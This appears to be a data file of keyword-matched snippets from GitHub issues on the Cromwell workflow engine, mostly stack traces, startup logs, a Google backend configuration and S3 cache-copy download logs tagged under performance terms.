scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1890:2114,concurren,concurrent,2114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1890,1,['concurren'],['concurrent']
Performance,.scala:36); 	at akka.actor.FSM$class.processEvent(FSM.scala:663); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowExecutionActor.scala:32); 	at akka.actor.LoggingFSM$class.processEvent(FSM.scala:799); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.processEvent(WorkflowExecutionActor.scala:32); 	at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:496); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.aroundReceive(WorkflowExecutionActor.scala:32); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: lenthall.exception.AggregatedException: :; Variable 'non_existent_scatter_variable' not found; 	at lenthall.util.TryUtil$.sequenceIterable(TryUtil.scala:26); 	at lenthall.util.TryUtil$.sequence(TryUtil.scala:33); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActor$$startRunnableScopes(WorkflowExecutionActor.scala:373); 	... 20 common frames omitted; 	Suppressed: wdl4s.exception.VariableNotFoundException$$anon$1: Variable 'non_existent_scatter_variable' not found; 		at wdl4s.exception.VariableNotFoundException$.apply(LookupException.scala:17); 		at wdl4s.Scope$$anonfun$6.apply(Scope.sca,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2020:2786,concurren,concurrent,2786,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2020,1,['concurren'],['concurrent']
Performance,".scala:442); at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); at scala.collection.Iterator.foreach(Iterator.scala:941); at scala.collection.Iterator.foreach$(Iterator.scala:941); at scala.collection.AbstractIterator.foreach(Iterator.scala:1429); at scala.collection.IterableLike.foreach(IterableLike.scala:74); at scala.collection.IterableLike.foreach$(IterableLike.scala:73); at scala.collection.AbstractIterable.foreach(Iterable.scala:56); at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); at wdl.draft2.model.WdlNamespace$.$anonfun$apply$51(WdlNamespace.scala:441); at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); at scala.collection.Iterator.foreach(Iterator.scala:941); at scala.collection.Iterator.foreach$(Iterator.scala:941); at scala.collection.AbstractIterator.foreach(Iterator.scala:1429); at scala.collection.IterableLike.foreach(IterableLike.scala:74); at scala.collection.IterableLike.foreach$(IterableLike.scala:73); at scala.collection.AbstractIterable.foreach(Iterable.scala:56); at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); at wdl.draft2.model.WdlNamespace$.apply(WdlNamespace.scala:440); at wdl.draft2.model.WdlNamespace$.$anonfun$load$1(WdlNamespace.scala:174); at scala.util.Try$.apply(Try.scala:213); at wdl.draft2.model.WdlNamespace$.load(WdlNamespace.scala:169); at wdl.draft2.model.WdlNamespace$.loadUsingSource(WdlNamespace.scala:161); at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:53); ... 27 common frames omitted; [2020-09-17 21:41:46,29] [info] Not triggering log of token queue status. Effective log interval = None; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:8672,load,load,8672,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,4,"['load', 'queue']","['load', 'loadUsingSource', 'queue']"
Performance,".scala:512); 	at cromwell.backend.impl.jes.statuspolling.JesApiQueryManager.akka$actor$Timers$$super$aroundReceive(JesApiQueryManager.scala:33); 	at akka.actor.Timers.aroundReceive(Timers.scala:44); 	at akka.actor.Timers.aroundReceive$(Timers.scala:36); 	at cromwell.backend.impl.jes.statuspolling.JesApiQueryManager.aroundReceive(JesApiQueryManager.scala:33); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); 	at akka.actor.ActorCell.invoke(ActorCell.scala:496); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; I also tried on another computer and another GCP project just to verify that it is not a cache problem. I don't know what is wrong. Seems like the service account has a problem, but I did everything the same way as when it worked. **Some detailed information:**. I have tried Cromwell 31.1 and 31. I start Cromwell using this command; `java -Dconfig.file=google.conf -jar cromwell-31.jar server`. **google.conf**; (I have changed the actual project name to generic ""project""); ```; include required(classpath(""application"")). google {. application-name = ""cromwell"". auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""project-test1""; }; }; }. backend {; default = ""JES""; providers {; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; // Google project; project = ""project-test1"". // Base bucket for workflow executions; root = ""gs://project-test1/cromwell-execution"". // Polling for completion",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690:3606,cache,cache,3606,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690,1,['cache'],['cache']
Performance,.scala:65); 	at cromwell.backend.standard.StandardAsyncExecutionActor.handleExecutionSuccess(StandardAsyncExecutionActor.scala:458); 	at cromwell.backend.standard.StandardAsyncExecutionActor.handleExecutionSuccess$(StandardAsyncExecutionActor.scala:455); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionSuccess(JesAsyncBackendJobExecutionActor.scala:65); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionResult$3(StandardAsyncExecutionActor.scala:651); 	at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:302); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:38); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.cloud.storage.StorageException: 503 Service Unavailable; 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.translate(HttpStorageRpc.java:189); 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.get(HttpStorageRpc.java:335); 	at com.google.cloud.storage.StorageImpl$5.call(StorageImpl.java:191); 	at com.google.cloud.storage.StorageImpl$5.call(Sto,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2576:3311,concurren,concurrent,3311,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2576,1,['concurren'],['concurrent']
Performance,".url = jdbc:hsqldb:mem:fad09ca5-b589-4874-b5de-bbd1dc0064fe;shutdown=false;hsqldb.tx=mvcc; [2019-07-10 14:32:53,36] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-07-10 14:32:53,38] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-07-10 14:32:53,46] [info] Running with database db.url = jdbc:hsqldb:mem:39174976-89f7-4769-a52c-7d5a4afc6cf4;shutdown=false;hsqldb.tx=mvcc; [2019-07-10 14:32:53,81] [info] Slf4jLogger started; [2019-07-10 14:32:54,07] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-1cf43fa"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""failureShutdownDuration"" : ""5 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2019-07-10 14:32:54,11] [info] Metadata summary refreshing every 1 second.; [2019-07-10 14:32:54,12] [warn] 'docker.hash-lookup.gcr-api-queries-per-100-seconds' is being deprecated, use 'docker.hash-lookup.gcr.throttle' instead (see reference.conf); [2019-07-10 14:32:54,12] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2019-07-10 14:32:54,13] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-07-10 14:32:54,13] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-07-10 14:32:54,18] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2019-07-10 14:32:54,43] [info] SingleWorkflowRunnerActor: Version 42; [2019-07-10 14:32:54,44] [info] SingleWorkflowRunnerActor: Submitting workflow; [2019-07-10 14:32:54,48] [info] Unspecified type (Unspecified version) workflow 41d3eecf-c5a9-42e4-8a29-8be9c252b7f5 submitted; [2019-07-10 14:32:54,50] [info] SingleWorkflowRunnerActor: Workflow submitted 41d3eecf-c5a9-42e4-8a29-8be9c252b7f5; [2019-07-10 14:32:54,50] [info] 1 new workflows fetched by cromid-1cf43fa: 41d3eecf-c5a9-42e4-8a29-8be9c252b7f5; [2019-07-10 14:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5066:5256,throttle,throttle,5256,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5066,1,['throttle'],['throttle']
Performance,.util.concurrent.CountDownLatch$Sync); at java.util.concurrent.locks.LockSupport.park(Redefined); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304); at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:231); at akka.actor.ActorSystemImpl$TerminationCallbacks.ready(Redefined); at akka.actor.ActorSystemImpl$TerminationCallbacks.ready(Redefined); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2$$anon$4.block(ExecutionContextImpl.scala); at scala.concurrent.forkjoin.ForkJoinPool.managedBlock(Redefined); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2.blockOn(ExecutionContextImpl.scala:44); at scala.concurrent.Await$.ready(package.scala:169); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellServer.scala:29); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellServer.scala); at scala.concurrent.Future$$anonfun$andThen$1.apply(Future.scala:433); at scala.concurrent.Future$$anonfun$andThen$1.apply(Future.scala); at scala.concurrent.impl.CallbackRunnable.run(Redefined); at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(Redefined); at scala.concurrent.forkjoin.Fork,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:45538,concurren,concurrent,45538,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".wait(Native Method); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143); - locked <0x00000006c0624180> (a java.lang.ref.ReferenceQueue$Lock); at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:43). ""ForkJoinPool-3-worker-15"" #19 daemon prio=5 os_prio=31 tid=0x00007fb76abaa800 nid=0x6b03 waiting on condition [0x000000012a1e3000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0060ab0> (a java.util.concurrent.CountDownLatch$Sync); at java.util.concurrent.locks.LockSupport.park(Redefined); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304); at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:231); at akka.actor.ActorSystemImpl$TerminationCallbacks.ready(Redefined); at akka.actor.ActorSystemImpl$TerminationCallbacks.ready(Redefined); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2$$anon$4.block(ExecutionContextImpl.scala); at scala.concurrent.forkjoin.ForkJoinPool.managedBlock(Redefined); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2.blockOn(ExecutionContextImpl.scala:44); at scala.concurrent.Await$.ready(package.scala:169); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellServer.scala:29); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellServer.scala); at scala.concurrent.Fu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:45018,concurren,concurrent,45018,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz.tbi; 1608597021127,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-134/cacheCopy/SR00c.NA19678.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-134/cacheCopy/SR00c.NA19678.txt.gz; 1608597023863,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-126/cacheCopy/SR00c.NA19143.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-126/cacheCopy/SR00c.NA19143.txt.gz; 1608597026409,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:22820,cache,cacheCopy,22820,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-12/cacheCopy/SR00c.HG00410.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-12/cacheCopy/SR00c.HG00410.txt.gz.tbi; 1608597418094,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-104/cacheCopy/SR00c.NA10847.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-104/cacheCopy/SR00c.NA10847.txt.gz; 1608597419738,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-1/cacheCopy/SR00c.HG00096.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-1/cacheCopy/SR00c.HG00096.txt.gz.tbi; 1608597421803,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evidenc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:130669,cache,cacheCopy,130669,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-14/cacheCopy/SR00c.HG00557.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-14/cacheCopy/SR00c.HG00557.txt.gz.tbi; 1608597245149,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-144/cacheCopy/SR00c.NA20346.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-144/cacheCopy/SR00c.NA20346.txt.gz; 1608597247776,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-88/cacheCopy/SR00c.HG03694.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-88/cacheCopy/SR00c.HG03694.txt.gz; 1608597249388,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:83894,cache,cacheCopy,83894,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-2/cacheCopy/SR00c.HG00129.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-2/cacheCopy/SR00c.HG00129.txt.gz.tbi; 1608596964153,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz.tbi; 1608596966063,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-120/cacheCopy/SR00c.NA18956.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-120/cacheCopy/SR00c.NA18956.txt.gz.tbi; 1608596968605,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:7221,cache,cacheCopy,7221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-23/cacheCopy/SR00c.HG01275.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-23/cacheCopy/SR00c.HG01275.txt.gz.tbi; 1608597272885,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz; 1608597275740,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-33/cacheCopy/SR00c.HG01607.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-33/cacheCopy/SR00c.HG01607.txt.gz; 1608597277147,download: 